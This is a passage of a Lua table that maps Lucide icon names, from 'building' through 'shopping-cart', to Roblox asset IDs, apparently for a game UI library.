	["lucide-building"] = "rbxassetid://10709783051",
	["lucide-building-2"] = "rbxassetid://10709782939",
	["lucide-bus"] = "rbxassetid://10709783137",
	["lucide-cake"] = "rbxassetid://10709783217",
	["lucide-calculator"] = "rbxassetid://10709783311",
	["lucide-calendar"] = "rbxassetid://10709789505",
	["lucide-calendar-check"] = "rbxassetid://10709783474",
	["lucide-calendar-check-2"] = "rbxassetid://10709783392",
	["lucide-calendar-clock"] = "rbxassetid://10709783577",
	["lucide-calendar-days"] = "rbxassetid://10709783673",
	["lucide-calendar-heart"] = "rbxassetid://10709783835",
	["lucide-calendar-minus"] = "rbxassetid://10709783959",
	["lucide-calendar-off"] = "rbxassetid://10709788784",
	["lucide-calendar-plus"] = "rbxassetid://10709788937",
	["lucide-calendar-range"] = "rbxassetid://10709789053",
	["lucide-calendar-search"] = "rbxassetid://10709789200",
	["lucide-calendar-x"] = "rbxassetid://10709789407",
	["lucide-calendar-x-2"] = "rbxassetid://10709789329",
	["lucide-camera"] = "rbxassetid://10709789686",
	["lucide-camera-off"] = "rbxassetid://10747822677",
	["lucide-car"] = "rbxassetid://10709789810",
	["lucide-carrot"] = "rbxassetid://10709789960",
	["lucide-cast"] = "rbxassetid://10709790097",
	["lucide-charge"] = "rbxassetid://10709790202",
	["lucide-check"] = "rbxassetid://10709790644",
	["lucide-check-circle"] = "rbxassetid://10709790387",
	["lucide-check-circle-2"] = "rbxassetid://10709790298",
	["lucide-check-square"] = "rbxassetid://10709790537",
	["lucide-chef-hat"] = "rbxassetid://10709790757",
	["lucide-cherry"] = "rbxassetid://10709790875",
	["lucide-chevron-down"] = "rbxassetid://10709790948",
	["lucide-chevron-first"] = "rbxassetid://10709791015",
	["lucide-chevron-last"] = "rbxassetid://10709791130",
	["lucide-chevron-left"] = "rbxassetid://10709791281",
	["lucide-chevron-right"] = "rbxassetid://10709791437",
	["lucide-chevron-up"] = "rbxassetid://10709791523",
	["lucide-chevrons-down"] = "rbxassetid://10709796864",
	["lucide-chevrons-down-up"] = "rbxassetid://10709791632",
	["lucide-chevrons-left"] = "rbxassetid://10709797151",
	["lucide-chevrons-left-right"] = "rbxassetid://10709797006",
	["lucide-chevrons-right"] = "rbxassetid://10709797382",
	["lucide-chevrons-right-left"] = "rbxassetid://10709797274",
	["lucide-chevrons-up"] = "rbxassetid://10709797622",
	["lucide-chevrons-up-down"] = "rbxassetid://10709797508",
	["lucide-chrome"] = "rbxassetid://10709797725",
	["lucide-circle"] = "rbxassetid://10709798174",
	["lucide-circle-dot"] = "rbxassetid://10709797837",
	["lucide-circle-ellipsis"] = "rbxassetid://10709797985",
	["lucide-circle-slashed"] = "rbxassetid://10709798100",
	["lucide-citrus"] = "rbxassetid://10709798276",
	["lucide-clapperboard"] = "rbxassetid://10709798350",
	["lucide-clipboard"] = "rbxassetid://10709799288",
	["lucide-clipboard-check"] = "rbxassetid://10709798443",
	["lucide-clipboard-copy"] = "rbxassetid://10709798574",
	["lucide-clipboard-edit"] = "rbxassetid://10709798682",
	["lucide-clipboard-list"] = "rbxassetid://10709798792",
	["lucide-clipboard-signature"] = "rbxassetid://10709798890",
	["lucide-clipboard-type"] = "rbxassetid://10709798999",
	["lucide-clipboard-x"] = "rbxassetid://10709799124",
	["lucide-clock"] = "rbxassetid://10709805144",
	["lucide-clock-1"] = "rbxassetid://10709799535",
	["lucide-clock-10"] = "rbxassetid://10709799718",
	["lucide-clock-11"] = "rbxassetid://10709799818",
	["lucide-clock-12"] = "rbxassetid://10709799962",
	["lucide-clock-2"] = "rbxassetid://10709803876",
	["lucide-clock-3"] = "rbxassetid://10709803989",
	["lucide-clock-4"] = "rbxassetid://10709804164",
	["lucide-clock-5"] = "rbxassetid://10709804291",
	["lucide-clock-6"] = "rbxassetid://10709804435",
	["lucide-clock-7"] = "rbxassetid://10709804599",
	["lucide-clock-8"] = "rbxassetid://10709804784",
	["lucide-clock-9"] = "rbxassetid://10709804996",
	["lucide-cloud"] = "rbxassetid://10709806740",
	["lucide-cloud-cog"] = "rbxassetid://10709805262",
	["lucide-cloud-drizzle"] = "rbxassetid://10709805371",
	["lucide-cloud-fog"] = "rbxassetid://10709805477",
	["lucide-cloud-hail"] = "rbxassetid://10709805596",
	["lucide-cloud-lightning"] = "rbxassetid://10709805727",
	["lucide-cloud-moon"] = "rbxassetid://10709805942",
	["lucide-cloud-moon-rain"] = "rbxassetid://10709805838",
	["lucide-cloud-off"] = "rbxassetid://10709806060",
	["lucide-cloud-rain"] = "rbxassetid://10709806277",
	["lucide-cloud-rain-wind"] = "rbxassetid://10709806166",
	["lucide-cloud-snow"] = "rbxassetid://10709806374",
	["lucide-cloud-sun"] = "rbxassetid://10709806631",
	["lucide-cloud-sun-rain"] = "rbxassetid://10709806475",
	["lucide-cloudy"] = "rbxassetid://10709806859",
	["lucide-clover"] = "rbxassetid://10709806995",
	["lucide-code"] = "rbxassetid://10709810463",
	["lucide-code-2"] = "rbxassetid://10709807111",
	["lucide-codepen"] = "rbxassetid://10709810534",
	["lucide-codesandbox"] = "rbxassetid://10709810676",
	["lucide-coffee"] = "rbxassetid://10709810814",
	["lucide-cog"] = "rbxassetid://10709810948",
	["lucide-coins"] = "rbxassetid://10709811110",
	["lucide-columns"] = "rbxassetid://10709811261",
	["lucide-command"] = "rbxassetid://10709811365",
	["lucide-compass"] = "rbxassetid://10709811445",
	["lucide-component"] = "rbxassetid://10709811595",
	["lucide-concierge-bell"] = "rbxassetid://10709811706",
	["lucide-connection"] = "rbxassetid://10747361219",
	["lucide-contact"] = "rbxassetid://10709811834",
	["lucide-contrast"] = "rbxassetid://10709811939",
	["lucide-cookie"] = "rbxassetid://10709812067",
	["lucide-copy"] = "rbxassetid://10709812159",
	["lucide-copyleft"] = "rbxassetid://10709812251",
	["lucide-copyright"] = "rbxassetid://10709812311",
	["lucide-corner-down-left"] = "rbxassetid://10709812396",
	["lucide-corner-down-right"] = "rbxassetid://10709812485",
	["lucide-corner-left-down"] = "rbxassetid://10709812632",
	["lucide-corner-left-up"] = "rbxassetid://10709812784",
	["lucide-corner-right-down"] = "rbxassetid://10709812939",
	["lucide-corner-right-up"] = "rbxassetid://10709813094",
	["lucide-corner-up-left"] = "rbxassetid://10709813185",
	["lucide-corner-up-right"] = "rbxassetid://10709813281",
	["lucide-cpu"] = "rbxassetid://10709813383",
	["lucide-croissant"] = "rbxassetid://10709818125",
	["lucide-crop"] = "rbxassetid://10709818245",
	["lucide-cross"] = "rbxassetid://10709818399",
	["lucide-crosshair"] = "rbxassetid://10709818534",
	["lucide-crown"] = "rbxassetid://10709818626",
	["lucide-cup-soda"] = "rbxassetid://10709818763",
	["lucide-curly-braces"] = "rbxassetid://10709818847",
	["lucide-currency"] = "rbxassetid://10709818931",
	["lucide-database"] = "rbxassetid://10709818996",
	["lucide-delete"] = "rbxassetid://10709819059",
	["lucide-diamond"] = "rbxassetid://10709819149",
	["lucide-dice-1"] = "rbxassetid://10709819266",
	["lucide-dice-2"] = "rbxassetid://10709819361",
	["lucide-dice-3"] = "rbxassetid://10709819508",
	["lucide-dice-4"] = "rbxassetid://10709819670",
	["lucide-dice-5"] = "rbxassetid://10709819801",
	["lucide-dice-6"] = "rbxassetid://10709819896",
	["lucide-dices"] = "rbxassetid://10723343321",
	["lucide-diff"] = "rbxassetid://10723343416",
	["lucide-disc"] = "rbxassetid://10723343537",
	["lucide-divide"] = "rbxassetid://10723343805",
	["lucide-divide-circle"] = "rbxassetid://10723343636",
	["lucide-divide-square"] = "rbxassetid://10723343737",
	["lucide-dollar-sign"] = "rbxassetid://10723343958",
	["lucide-download"] = "rbxassetid://10723344270",
	["lucide-download-cloud"] = "rbxassetid://10723344088",
	["lucide-droplet"] = "rbxassetid://10723344432",
	["lucide-droplets"] = "rbxassetid://10734883356",
	["lucide-drumstick"] = "rbxassetid://10723344737",
	["lucide-edit"] = "rbxassetid://10734883598",
	["lucide-edit-2"] = "rbxassetid://10723344885",
	["lucide-edit-3"] = "rbxassetid://10723345088",
	["lucide-egg"] = "rbxassetid://10723345518",
	["lucide-egg-fried"] = "rbxassetid://10723345347",
	["lucide-electricity"] = "rbxassetid://10723345749",
	["lucide-electricity-off"] = "rbxassetid://10723345643",
	["lucide-equal"] = "rbxassetid://10723345990",
	["lucide-equal-not"] = "rbxassetid://10723345866",
	["lucide-eraser"] = "rbxassetid://10723346158",
	["lucide-euro"] = "rbxassetid://10723346372",
	["lucide-expand"] = "rbxassetid://10723346553",
	["lucide-external-link"] = "rbxassetid://10723346684",
	["lucide-eye"] = "rbxassetid://10723346959",
	["lucide-eye-off"] = "rbxassetid://10723346871",
	["lucide-factory"] = "rbxassetid://10723347051",
	["lucide-fan"] = "rbxassetid://10723354359",
	["lucide-fast-forward"] = "rbxassetid://10723354521",
	["lucide-feather"] = "rbxassetid://10723354671",
	["lucide-figma"] = "rbxassetid://10723354801",
	["lucide-file"] = "rbxassetid://10723374641",
	["lucide-file-archive"] = "rbxassetid://10723354921",
	["lucide-file-audio"] = "rbxassetid://10723355148",
	["lucide-file-audio-2"] = "rbxassetid://10723355026",
	["lucide-file-axis-3d"] = "rbxassetid://10723355272",
	["lucide-file-badge"] = "rbxassetid://10723355622",
	["lucide-file-badge-2"] = "rbxassetid://10723355451",
	["lucide-file-bar-chart"] = "rbxassetid://10723355887",
	["lucide-file-bar-chart-2"] = "rbxassetid://10723355746",
	["lucide-file-box"] = "rbxassetid://10723355989",
	["lucide-file-check"] = "rbxassetid://10723356210",
	["lucide-file-check-2"] = "rbxassetid://10723356100",
	["lucide-file-clock"] = "rbxassetid://10723356329",
	["lucide-file-code"] = "rbxassetid://10723356507",
	["lucide-file-cog"] = "rbxassetid://10723356830",
	["lucide-file-cog-2"] = "rbxassetid://10723356676",
	["lucide-file-diff"] = "rbxassetid://10723357039",
	["lucide-file-digit"] = "rbxassetid://10723357151",
	["lucide-file-down"] = "rbxassetid://10723357322",
	["lucide-file-edit"] = "rbxassetid://10723357495",
	["lucide-file-heart"] = "rbxassetid://10723357637",
	["lucide-file-image"] = "rbxassetid://10723357790",
	["lucide-file-input"] = "rbxassetid://10723357933",
	["lucide-file-json"] = "rbxassetid://10723364435",
	["lucide-file-json-2"] = "rbxassetid://10723364361",
	["lucide-file-key"] = "rbxassetid://10723364605",
	["lucide-file-key-2"] = "rbxassetid://10723364515",
	["lucide-file-line-chart"] = "rbxassetid://10723364725",
	["lucide-file-lock"] = "rbxassetid://10723364957",
	["lucide-file-lock-2"] = "rbxassetid://10723364861",
	["lucide-file-minus"] = "rbxassetid://10723365254",
	["lucide-file-minus-2"] = "rbxassetid://10723365086",
	["lucide-file-output"] = "rbxassetid://10723365457",
	["lucide-file-pie-chart"] = "rbxassetid://10723365598",
	["lucide-file-plus"] = "rbxassetid://10723365877",
	["lucide-file-plus-2"] = "rbxassetid://10723365766",
	["lucide-file-question"] = "rbxassetid://10723365987",
	["lucide-file-scan"] = "rbxassetid://10723366167",
	["lucide-file-search"] = "rbxassetid://10723366550",
	["lucide-file-search-2"] = "rbxassetid://10723366340",
	["lucide-file-signature"] = "rbxassetid://10723366741",
	["lucide-file-spreadsheet"] = "rbxassetid://10723366962",
	["lucide-file-symlink"] = "rbxassetid://10723367098",
	["lucide-file-terminal"] = "rbxassetid://10723367244",
	["lucide-file-text"] = "rbxassetid://10723367380",
	["lucide-file-type"] = "rbxassetid://10723367606",
	["lucide-file-type-2"] = "rbxassetid://10723367509",
	["lucide-file-up"] = "rbxassetid://10723367734",
	["lucide-file-video"] = "rbxassetid://10723373884",
	["lucide-file-video-2"] = "rbxassetid://10723367834",
	["lucide-file-volume"] = "rbxassetid://10723374172",
	["lucide-file-volume-2"] = "rbxassetid://10723374030",
	["lucide-file-warning"] = "rbxassetid://10723374276",
	["lucide-file-x"] = "rbxassetid://10723374544",
	["lucide-file-x-2"] = "rbxassetid://10723374378",
	["lucide-files"] = "rbxassetid://10723374759",
	["lucide-film"] = "rbxassetid://10723374981",
	["lucide-filter"] = "rbxassetid://10723375128",
	["lucide-fingerprint"] = "rbxassetid://10723375250",
	["lucide-flag"] = "rbxassetid://10723375890",
	["lucide-flag-off"] = "rbxassetid://10723375443",
	["lucide-flag-triangle-left"] = "rbxassetid://10723375608",
	["lucide-flag-triangle-right"] = "rbxassetid://10723375727",
	["lucide-flame"] = "rbxassetid://10723376114",
	["lucide-flashlight"] = "rbxassetid://10723376471",
	["lucide-flashlight-off"] = "rbxassetid://10723376365",
	["lucide-flask-conical"] = "rbxassetid://10734883986",
	["lucide-flask-round"] = "rbxassetid://10723376614",
	["lucide-flip-horizontal"] = "rbxassetid://10723376884",
	["lucide-flip-horizontal-2"] = "rbxassetid://10723376745",
	["lucide-flip-vertical"] = "rbxassetid://10723377138",
	["lucide-flip-vertical-2"] = "rbxassetid://10723377026",
	["lucide-flower"] = "rbxassetid://10747830374",
	["lucide-flower-2"] = "rbxassetid://10723377305",
	["lucide-focus"] = "rbxassetid://10723377537",
	["lucide-folder"] = "rbxassetid://10723387563",
	["lucide-folder-archive"] = "rbxassetid://10723384478",
	["lucide-folder-check"] = "rbxassetid://10723384605",
	["lucide-folder-clock"] = "rbxassetid://10723384731",
	["lucide-folder-closed"] = "rbxassetid://10723384893",
	["lucide-folder-cog"] = "rbxassetid://10723385213",
	["lucide-folder-cog-2"] = "rbxassetid://10723385036",
	["lucide-folder-down"] = "rbxassetid://10723385338",
	["lucide-folder-edit"] = "rbxassetid://10723385445",
	["lucide-folder-heart"] = "rbxassetid://10723385545",
	["lucide-folder-input"] = "rbxassetid://10723385721",
	["lucide-folder-key"] = "rbxassetid://10723385848",
	["lucide-folder-lock"] = "rbxassetid://10723386005",
	["lucide-folder-minus"] = "rbxassetid://10723386127",
	["lucide-folder-open"] = "rbxassetid://10723386277",
	["lucide-folder-output"] = "rbxassetid://10723386386",
	["lucide-folder-plus"] = "rbxassetid://10723386531",
	["lucide-folder-search"] = "rbxassetid://10723386787",
	["lucide-folder-search-2"] = "rbxassetid://10723386674",
	["lucide-folder-symlink"] = "rbxassetid://10723386930",
	["lucide-folder-tree"] = "rbxassetid://10723387085",
	["lucide-folder-up"] = "rbxassetid://10723387265",
	["lucide-folder-x"] = "rbxassetid://10723387448",
	["lucide-folders"] = "rbxassetid://10723387721",
	["lucide-form-input"] = "rbxassetid://10723387841",
	["lucide-forward"] = "rbxassetid://10723388016",
	["lucide-frame"] = "rbxassetid://10723394389",
	["lucide-framer"] = "rbxassetid://10723394565",
	["lucide-frown"] = "rbxassetid://10723394681",
	["lucide-fuel"] = "rbxassetid://10723394846",
	["lucide-function-square"] = "rbxassetid://10723395041",
	["lucide-gamepad"] = "rbxassetid://10723395457",
	["lucide-gamepad-2"] = "rbxassetid://10723395215",
	["lucide-gauge"] = "rbxassetid://10723395708",
	["lucide-gavel"] = "rbxassetid://10723395896",
	["lucide-gem"] = "rbxassetid://10723396000",
	["lucide-ghost"] = "rbxassetid://10723396107",
	["lucide-gift"] = "rbxassetid://10723396402",
	["lucide-gift-card"] = "rbxassetid://10723396225",
	["lucide-git-branch"] = "rbxassetid://10723396676",
	["lucide-git-branch-plus"] = "rbxassetid://10723396542",
	["lucide-git-commit"] = "rbxassetid://10723396812",
	["lucide-git-compare"] = "rbxassetid://10723396954",
	["lucide-git-fork"] = "rbxassetid://10723397049",
	["lucide-git-merge"] = "rbxassetid://10723397165",
	["lucide-git-pull-request"] = "rbxassetid://10723397431",
	["lucide-git-pull-request-closed"] = "rbxassetid://10723397268",
	["lucide-git-pull-request-draft"] = "rbxassetid://10734884302",
	["lucide-glass"] = "rbxassetid://10723397788",
	["lucide-glass-2"] = "rbxassetid://10723397529",
	["lucide-glass-water"] = "rbxassetid://10723397678",
	["lucide-glasses"] = "rbxassetid://10723397895",
	["lucide-globe"] = "rbxassetid://10723404337",
	["lucide-globe-2"] = "rbxassetid://10723398002",
	["lucide-grab"] = "rbxassetid://10723404472",
	["lucide-graduation-cap"] = "rbxassetid://10723404691",
	["lucide-grape"] = "rbxassetid://10723404822",
	["lucide-grid"] = "rbxassetid://10723404936",
	["lucide-grip-horizontal"] = "rbxassetid://10723405089",
	["lucide-grip-vertical"] = "rbxassetid://10723405236",
	["lucide-hammer"] = "rbxassetid://10723405360",
	["lucide-hand"] = "rbxassetid://10723405649",
	["lucide-hand-metal"] = "rbxassetid://10723405508",
	["lucide-hard-drive"] = "rbxassetid://10723405749",
	["lucide-hard-hat"] = "rbxassetid://10723405859",
	["lucide-hash"] = "rbxassetid://10723405975",
	["lucide-haze"] = "rbxassetid://10723406078",
	["lucide-headphones"] = "rbxassetid://10723406165",
	["lucide-heart"] = "rbxassetid://10723406885",
	["lucide-heart-crack"] = "rbxassetid://10723406299",
	["lucide-heart-handshake"] = "rbxassetid://10723406480",
	["lucide-heart-off"] = "rbxassetid://10723406662",
	["lucide-heart-pulse"] = "rbxassetid://10723406795",
	["lucide-help-circle"] = "rbxassetid://10723406988",
	["lucide-hexagon"] = "rbxassetid://10723407092",
	["lucide-highlighter"] = "rbxassetid://10723407192",
	["lucide-history"] = "rbxassetid://10723407335",
	["lucide-home"] = "rbxassetid://10723407389",
	["lucide-hourglass"] = "rbxassetid://10723407498",
	["lucide-ice-cream"] = "rbxassetid://10723414308",
	["lucide-image"] = "rbxassetid://10723415040",
	["lucide-image-minus"] = "rbxassetid://10723414487",
	["lucide-image-off"] = "rbxassetid://10723414677",
	["lucide-image-plus"] = "rbxassetid://10723414827",
	["lucide-import"] = "rbxassetid://10723415205",
	["lucide-inbox"] = "rbxassetid://10723415335",
	["lucide-indent"] = "rbxassetid://10723415494",
	["lucide-indian-rupee"] = "rbxassetid://10723415642",
	["lucide-infinity"] = "rbxassetid://10723415766",
	["lucide-info"] = "rbxassetid://10723415903",
	["lucide-inspect"] = "rbxassetid://10723416057",
	["lucide-italic"] = "rbxassetid://10723416195",
	["lucide-japanese-yen"] = "rbxassetid://10723416363",
	["lucide-joystick"] = "rbxassetid://10723416527",
	["lucide-key"] = "rbxassetid://10723416652",
	["lucide-keyboard"] = "rbxassetid://10723416765",
	["lucide-lamp"] = "rbxassetid://10723417513",
	["lucide-lamp-ceiling"] = "rbxassetid://10723416922",
	["lucide-lamp-desk"] = "rbxassetid://10723417016",
	["lucide-lamp-floor"] = "rbxassetid://10723417131",
	["lucide-lamp-wall-down"] = "rbxassetid://10723417240",
	["lucide-lamp-wall-up"] = "rbxassetid://10723417356",
	["lucide-landmark"] = "rbxassetid://10723417608",
	["lucide-languages"] = "rbxassetid://10723417703",
	["lucide-laptop"] = "rbxassetid://10723423881",
	["lucide-laptop-2"] = "rbxassetid://10723417797",
	["lucide-lasso"] = "rbxassetid://10723424235",
	["lucide-lasso-select"] = "rbxassetid://10723424058",
	["lucide-laugh"] = "rbxassetid://10723424372",
	["lucide-layers"] = "rbxassetid://10723424505",
	["lucide-layout"] = "rbxassetid://10723425376",
	["lucide-layout-dashboard"] = "rbxassetid://10723424646",
	["lucide-layout-grid"] = "rbxassetid://10723424838",
	["lucide-layout-list"] = "rbxassetid://10723424963",
	["lucide-layout-template"] = "rbxassetid://10723425187",
	["lucide-leaf"] = "rbxassetid://10723425539",
	["lucide-library"] = "rbxassetid://10723425615",
	["lucide-life-buoy"] = "rbxassetid://10723425685",
	["lucide-lightbulb"] = "rbxassetid://10723425852",
	["lucide-lightbulb-off"] = "rbxassetid://10723425762",
	["lucide-line-chart"] = "rbxassetid://10723426393",
	["lucide-link"] = "rbxassetid://10723426722",
	["lucide-link-2"] = "rbxassetid://10723426595",
	["lucide-link-2-off"] = "rbxassetid://10723426513",
	["lucide-list"] = "rbxassetid://10723433811",
	["lucide-list-checks"] = "rbxassetid://10734884548",
	["lucide-list-end"] = "rbxassetid://10723426886",
	["lucide-list-minus"] = "rbxassetid://10723426986",
	["lucide-list-music"] = "rbxassetid://10723427081",
	["lucide-list-ordered"] = "rbxassetid://10723427199",
	["lucide-list-plus"] = "rbxassetid://10723427334",
	["lucide-list-start"] = "rbxassetid://10723427494",
	["lucide-list-video"] = "rbxassetid://10723427619",
	["lucide-list-x"] = "rbxassetid://10723433655",
	["lucide-loader"] = "rbxassetid://10723434070",
	["lucide-loader-2"] = "rbxassetid://10723433935",
	["lucide-locate"] = "rbxassetid://10723434557",
	["lucide-locate-fixed"] = "rbxassetid://10723434236",
	["lucide-locate-off"] = "rbxassetid://10723434379",
	["lucide-lock"] = "rbxassetid://10723434711",
	["lucide-log-in"] = "rbxassetid://10723434830",
	["lucide-log-out"] = "rbxassetid://10723434906",
	["lucide-luggage"] = "rbxassetid://10723434993",
	["lucide-magnet"] = "rbxassetid://10723435069",
	["lucide-mail"] = "rbxassetid://10734885430",
	["lucide-mail-check"] = "rbxassetid://10723435182",
	["lucide-mail-minus"] = "rbxassetid://10723435261",
	["lucide-mail-open"] = "rbxassetid://10723435342",
	["lucide-mail-plus"] = "rbxassetid://10723435443",
	["lucide-mail-question"] = "rbxassetid://10723435515",
	["lucide-mail-search"] = "rbxassetid://10734884739",
	["lucide-mail-warning"] = "rbxassetid://10734885015",
	["lucide-mail-x"] = "rbxassetid://10734885247",
	["lucide-mails"] = "rbxassetid://10734885614",
	["lucide-map"] = "rbxassetid://10734886202",
	["lucide-map-pin"] = "rbxassetid://10734886004",
	["lucide-map-pin-off"] = "rbxassetid://10734885803",
	["lucide-maximize"] = "rbxassetid://10734886735",
	["lucide-maximize-2"] = "rbxassetid://10734886496",
	["lucide-medal"] = "rbxassetid://10734887072",
	["lucide-megaphone"] = "rbxassetid://10734887454",
	["lucide-megaphone-off"] = "rbxassetid://10734887311",
	["lucide-meh"] = "rbxassetid://10734887603",
	["lucide-menu"] = "rbxassetid://10734887784",
	["lucide-message-circle"] = "rbxassetid://10734888000",
	["lucide-message-square"] = "rbxassetid://10734888228",
	["lucide-mic"] = "rbxassetid://10734888864",
	["lucide-mic-2"] = "rbxassetid://10734888430",
	["lucide-mic-off"] = "rbxassetid://10734888646",
	["lucide-microscope"] = "rbxassetid://10734889106",
	["lucide-microwave"] = "rbxassetid://10734895076",
	["lucide-milestone"] = "rbxassetid://10734895310",
	["lucide-minimize"] = "rbxassetid://10734895698",
	["lucide-minimize-2"] = "rbxassetid://10734895530",
	["lucide-minus"] = "rbxassetid://10734896206",
	["lucide-minus-circle"] = "rbxassetid://10734895856",
	["lucide-minus-square"] = "rbxassetid://10734896029",
	["lucide-monitor"] = "rbxassetid://10734896881",
	["lucide-monitor-off"] = "rbxassetid://10734896360",
	["lucide-monitor-speaker"] = "rbxassetid://10734896512",
	["lucide-moon"] = "rbxassetid://10734897102",
	["lucide-more-horizontal"] = "rbxassetid://10734897250",
	["lucide-more-vertical"] = "rbxassetid://10734897387",
	["lucide-mountain"] = "rbxassetid://10734897956",
	["lucide-mountain-snow"] = "rbxassetid://10734897665",
	["lucide-mouse"] = "rbxassetid://10734898592",
	["lucide-mouse-pointer"] = "rbxassetid://10734898476",
	["lucide-mouse-pointer-2"] = "rbxassetid://10734898194",
	["lucide-mouse-pointer-click"] = "rbxassetid://10734898355",
	["lucide-move"] = "rbxassetid://10734900011",
	["lucide-move-3d"] = "rbxassetid://10734898756",
	["lucide-move-diagonal"] = "rbxassetid://10734899164",
	["lucide-move-diagonal-2"] = "rbxassetid://10734898934",
	["lucide-move-horizontal"] = "rbxassetid://10734899414",
	["lucide-move-vertical"] = "rbxassetid://10734899821",
	["lucide-music"] = "rbxassetid://10734905958",
	["lucide-music-2"] = "rbxassetid://10734900215",
	["lucide-music-3"] = "rbxassetid://10734905665",
	["lucide-music-4"] = "rbxassetid://10734905823",
	["lucide-navigation"] = "rbxassetid://10734906744",
	["lucide-navigation-2"] = "rbxassetid://10734906332",
	["lucide-navigation-2-off"] = "rbxassetid://10734906144",
	["lucide-navigation-off"] = "rbxassetid://10734906580",
	["lucide-network"] = "rbxassetid://10734906975",
	["lucide-newspaper"] = "rbxassetid://10734907168",
	["lucide-octagon"] = "rbxassetid://10734907361",
	["lucide-option"] = "rbxassetid://10734907649",
	["lucide-outdent"] = "rbxassetid://10734907933",
	["lucide-package"] = "rbxassetid://10734909540",
	["lucide-package-2"] = "rbxassetid://10734908151",
	["lucide-package-check"] = "rbxassetid://10734908384",
	["lucide-package-minus"] = "rbxassetid://10734908626",
	["lucide-package-open"] = "rbxassetid://10734908793",
	["lucide-package-plus"] = "rbxassetid://10734909016",
	["lucide-package-search"] = "rbxassetid://10734909196",
	["lucide-package-x"] = "rbxassetid://10734909375",
	["lucide-paint-bucket"] = "rbxassetid://10734909847",
	["lucide-paintbrush"] = "rbxassetid://10734910187",
	["lucide-paintbrush-2"] = "rbxassetid://10734910030",
	["lucide-palette"] = "rbxassetid://10734910430",
	["lucide-palmtree"] = "rbxassetid://10734910680",
	["lucide-paperclip"] = "rbxassetid://10734910927",
	["lucide-party-popper"] = "rbxassetid://10734918735",
	["lucide-pause"] = "rbxassetid://10734919336",
	["lucide-pause-circle"] = "rbxassetid://10735024209",
	["lucide-pause-octagon"] = "rbxassetid://10734919143",
	["lucide-pen-tool"] = "rbxassetid://10734919503",
	["lucide-pencil"] = "rbxassetid://10734919691",
	["lucide-percent"] = "rbxassetid://10734919919",
	["lucide-person-standing"] = "rbxassetid://10734920149",
	["lucide-phone"] = "rbxassetid://10734921524",
	["lucide-phone-call"] = "rbxassetid://10734920305",
	["lucide-phone-forwarded"] = "rbxassetid://10734920508",
	["lucide-phone-incoming"] = "rbxassetid://10734920694",
	["lucide-phone-missed"] = "rbxassetid://10734920845",
	["lucide-phone-off"] = "rbxassetid://10734921077",
	["lucide-phone-outgoing"] = "rbxassetid://10734921288",
	["lucide-pie-chart"] = "rbxassetid://10734921727",
	["lucide-piggy-bank"] = "rbxassetid://10734921935",
	["lucide-pin"] = "rbxassetid://10734922324",
	["lucide-pin-off"] = "rbxassetid://10734922180",
	["lucide-pipette"] = "rbxassetid://10734922497",
	["lucide-pizza"] = "rbxassetid://10734922774",
	["lucide-plane"] = "rbxassetid://10734922971",
	["lucide-play"] = "rbxassetid://10734923549",
	["lucide-play-circle"] = "rbxassetid://10734923214",
	["lucide-plus"] = "rbxassetid://10734924532",
	["lucide-plus-circle"] = "rbxassetid://10734923868",
	["lucide-plus-square"] = "rbxassetid://10734924219",
	["lucide-podcast"] = "rbxassetid://10734929553",
	["lucide-pointer"] = "rbxassetid://10734929723",
	["lucide-pound-sterling"] = "rbxassetid://10734929981",
	["lucide-power"] = "rbxassetid://10734930466",
	["lucide-power-off"] = "rbxassetid://10734930257",
	["lucide-printer"] = "rbxassetid://10734930632",
	["lucide-puzzle"] = "rbxassetid://10734930886",
	["lucide-quote"] = "rbxassetid://10734931234",
	["lucide-radio"] = "rbxassetid://10734931596",
	["lucide-radio-receiver"] = "rbxassetid://10734931402",
	["lucide-rectangle-horizontal"] = "rbxassetid://10734931777",
	["lucide-rectangle-vertical"] = "rbxassetid://10734932081",
	["lucide-recycle"] = "rbxassetid://10734932295",
	["lucide-redo"] = "rbxassetid://10734932822",
	["lucide-redo-2"] = "rbxassetid://10734932586",
	["lucide-refresh-ccw"] = "rbxassetid://10734933056",
	["lucide-refresh-cw"] = "rbxassetid://10734933222",
	["lucide-refrigerator"] = "rbxassetid://10734933465",
	["lucide-regex"] = "rbxassetid://10734933655",
	["lucide-repeat"] = "rbxassetid://10734933966",
	["lucide-repeat-1"] = "rbxassetid://10734933826",
	["lucide-reply"] = "rbxassetid://10734934252",
	["lucide-reply-all"] = "rbxassetid://10734934132",
	["lucide-rewind"] = "rbxassetid://10734934347",
	["lucide-rocket"] = "rbxassetid://10734934585",
	["lucide-rocking-chair"] = "rbxassetid://10734939942",
	["lucide-rotate-3d"] = "rbxassetid://10734940107",
	["lucide-rotate-ccw"] = "rbxassetid://10734940376",
	["lucide-rotate-cw"] = "rbxassetid://10734940654",
	["lucide-rss"] = "rbxassetid://10734940825",
	["lucide-ruler"] = "rbxassetid://10734941018",
	["lucide-russian-ruble"] = "rbxassetid://10734941199",
	["lucide-sailboat"] = "rbxassetid://10734941354",
	["lucide-save"] = "rbxassetid://10734941499",
	["lucide-scale"] = "rbxassetid://10734941912",
	["lucide-scale-3d"] = "rbxassetid://10734941739",
	["lucide-scaling"] = "rbxassetid://10734942072",
	["lucide-scan"] = "rbxassetid://10734942565",
	["lucide-scan-face"] = "rbxassetid://10734942198",
	["lucide-scan-line"] = "rbxassetid://10734942351",
	["lucide-scissors"] = "rbxassetid://10734942778",
	["lucide-screen-share"] = "rbxassetid://10734943193",
	["lucide-screen-share-off"] = "rbxassetid://10734942967",
	["lucide-scroll"] = "rbxassetid://10734943448",
	["lucide-search"] = "rbxassetid://10734943674",
	["lucide-send"] = "rbxassetid://10734943902",
	["lucide-separator-horizontal"] = "rbxassetid://10734944115",
	["lucide-separator-vertical"] = "rbxassetid://10734944326",
	["lucide-server"] = "rbxassetid://10734949856",
	["lucide-server-cog"] = "rbxassetid://10734944444",
	["lucide-server-crash"] = "rbxassetid://10734944554",
	["lucide-server-off"] = "rbxassetid://10734944668",
	["lucide-settings"] = "rbxassetid://10734950309",
	["lucide-settings-2"] = "rbxassetid://10734950020",
	["lucide-share"] = "rbxassetid://10734950813",
	["lucide-share-2"] = "rbxassetid://10734950553",
	["lucide-sheet"] = "rbxassetid://10734951038",
	["lucide-shield"] = "rbxassetid://10734951847",
	["lucide-shield-alert"] = "rbxassetid://10734951173",
	["lucide-shield-check"] = "rbxassetid://10734951367",
	["lucide-shield-close"] = "rbxassetid://10734951535",
	["lucide-shield-off"] = "rbxassetid://10734951684",
	["lucide-shirt"] = "rbxassetid://10734952036",
	["lucide-shopping-bag"] = "rbxassetid://10734952273",
	["lucide-shopping-cart"] = "rbxassetid://10734952479",
